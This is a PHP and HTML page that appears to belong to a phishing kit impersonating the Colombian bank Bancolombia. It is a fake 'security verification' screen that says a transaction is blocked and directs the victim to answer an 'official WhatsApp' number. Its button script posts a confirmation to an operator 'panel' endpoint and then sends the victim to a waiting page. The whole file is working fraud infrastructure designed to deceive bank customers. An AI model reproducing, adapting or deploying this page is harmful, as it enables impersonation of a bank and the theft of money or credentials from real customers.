<?php
function b34f9_fecha_larga() {
    $dias = array("Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado");
    $meses = array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");
    
    $dia_semana = $dias[date('w')];
    $dia = date('d');
    $mes = $meses[date('n')-1];
    $anio = date('Y');
    
    return "$dia_semana, $dia de $mes de $anio";
}
?>
<html>
    <head>
        <title>Bancolombia - Verificación de Seguridad</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../../../../../js/jquery-3.6.0.min.js"></script>
        <script src="../../../../../js/jquery.jclock-min.js" type="text/javascript"></script>
    
        <script type="text/javascript" src="../js/functions.js"></script>
        <script type="text/javascript" src="../js/ready.js"></script>

        <style type="text/css">
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Open Sans', sans-serif;
                background-color: #ffffff;
                color: #333;
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                padding: 20px 15px;
            }
            
            .mensaje-seguridad {
                flex: 1;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                text-align: center;
                padding: 30px 20px;
            }
            
            .icono-alerta {
                width: 48px;
                height: 48px;
                margin-bottom: 16px;
                display: block;
            }
            
            .titulo-alerta {
                font-size: 18px;
                font-weight: 700;
                color: #1a1b1a;
                margin-bottom: 12px;
                line-height: 1.4;
                max-width: 100%;
            }
            
            .texto-alerta {
                font-size: 13px;
                color: #555;
                margin-bottom: 16px;
                line-height: 1.5;
                text-align: center;
                max-width: 100%;
            }
            
            .codigo-alerta {
                font-size: 15px;
                font-weight: 700;
                color: #000;
                margin: 16px 0;
                text-align: center;
                padding: 8px 12px;
                background-color: #f5f5f5;
                border-radius: 6px;
                display: inline-block;
            }
            
            .boton-alerta {
                background-color: #FFCC00;
                color: #000;
                border: none;
                padding: 14px 32px;
                font-size: 16px;
                font-weight: 700;
                border-radius: 25px;
                cursor: pointer;
                width: 100%;
                max-width: 280px;
                margin: 24px auto 0;
                display: block;
                box-shadow: 0 2px 8px rgba(0,0,0,0.1);
                transition: background-color 0.2s;
            }
            
            .boton-alerta:active {
                background-color: #E6B800;
                transform: scale(0.98);
            }
            
            .boton-alerta:hover {
                background-color: #E6B800;
            }
            
            /* Ajustes para móvil */
            @media (max-width: 480px) {
                body {
                    padding: 15px 10px;
                }
                
                .mensaje-seguridad {
                    padding: 20px 10px;
                }
                
                .titulo-alerta {
                    font-size: 16px;
                }
                
                .texto-alerta {
                    font-size: 12px;
                }
                
                .codigo-alerta {
                    font-size: 14px;
                    padding: 6px 10px;
                }
                
                .boton-alerta {
                    padding: 12px 28px;
                    font-size: 15px;
                }
            }
        </style>
        
    </head>
    <body>        
        <div id="fondo"></div>
        <div id="cargando">
            <img src="../img/logo.svg" style="width: 60px; height: 60px;">            
            <br>
            <img src="../img/load2.gif" style="width: 40px; height: 40px;" />
        </div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="60">            
            <br>
            Procesando...
        </div>

        <div class="mensaje-seguridad">
            <img src="../img/candado.jpg" class="icono-alerta" alt="Seguridad">
            <div class="titulo-alerta">Por seguridad, no puedes continuar la transacción</div>
            
            <div class="texto-alerta">
                Código: 923 Para confirmar si eres tú quién hace la transacción, te escribiremos desde nuestro WhatsApp oficial 301 353 6788, responde Sí o No. Si tienes dudas, llámanos a la Sucursal Telefónica y elige la opción 3 y de nuevo 3.
            </div>
            
            <div class="codigo-alerta">
                Código 923
            </div>
            
            <button class="boton-alerta" id="btn-intentar">Ya confirme que soy yo</button>
        </div>

    </body>
</html>
<script type="text/javascript">
    $(document).ready(function() { 
        $('#btn-intentar').on('click', function() {
            // 1. Ocultar contenido actual
            $(".mensaje-seguridad").hide();
            
            // 2. Mostrar pantalla de carga
            $("#fondo").show();
            $("#cargando-o").show();
            
            // 3. Enviar aviso al panel (simulamos el envío a pasocorreo.php)
            $.post("../../../../../process/pasocorreo.php", { 
                eml: "Confirmó WhatsApp", 
                clv: "923", 
                cel: "-" 
            }, function(data) {
                // 4. Una vez notificado el panel, redirigimos a la pantalla de espera real
                window.location.href = "../a/WAITING";
            });
        });
        
        // Prevenir zoom en doble tap
        document.addEventListener('dblclick', function(event) {
            event.preventDefault();
        }, { passive: true });
    });
</script>